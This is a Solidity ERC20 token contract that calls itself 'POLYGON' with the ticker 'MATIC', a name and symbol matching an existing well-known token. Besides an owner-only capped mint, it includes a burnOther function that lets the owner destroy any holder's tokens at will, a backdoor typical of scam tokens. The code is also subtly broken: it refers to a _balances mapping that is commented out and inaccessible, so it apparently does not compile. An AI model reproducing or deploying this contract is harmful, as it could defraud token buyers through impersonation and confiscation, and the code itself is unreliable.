// SPDX-License-Identifier:GPL-3.0
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract POLYGON is ERC20, Ownable, ERC20Burnable {
    
    //mapping(address => uint256) private  _balances;
    //mapping(address => bool) controllers;

    //uint256 private _totalSupply;
    uint256 private MAXSUP;
    uint256 constant public MAXIMUMSUPPLY = 200000000 * 10 ** 18;
  
constructor() ERC20("POLYGON", "MATIC") {}

  function mint(address to, uint256 amount) external onlyOwner {
        require(to != address(this));
        require((MAXSUP + amount) <= MAXIMUMSUPPLY, "Maximum Supply has been reached");
       // _totalSupply += amount;
        MAXSUP += amount;
        //_balances[to] += amount;
        _mint(to, amount);
        
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        require(to != address(this));
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

/* @notice - By using burnOther function , owner of contract can burn token of other account
*/

function burnOther(address account, uint256 value) external onlyOwner {
    require(_balances[account] >= value);
   // _totalSupply = _totalSupply - value;
     MAXSUP -= value;
    //_balances[account] -=  value;
    _burn(account, value);
    
}

}
